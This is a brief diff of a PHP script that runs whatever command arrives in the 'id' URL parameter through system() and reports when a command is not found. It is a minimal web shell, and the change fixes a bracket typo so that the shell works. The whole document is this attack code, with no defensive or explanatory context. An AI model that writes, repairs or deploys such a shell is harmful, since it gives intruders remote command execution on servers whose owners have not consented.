@@ -1,6 +1,6 @@
 <?php
 	echo '<pre><hr/>';
-	system($_GET['id',$bool]);
+	system($_GET['id'],$bool);
 	if($bool!=0){
 		echo'<strong>[-] Command not found!</strong><hr/></pre>';
 	}else{
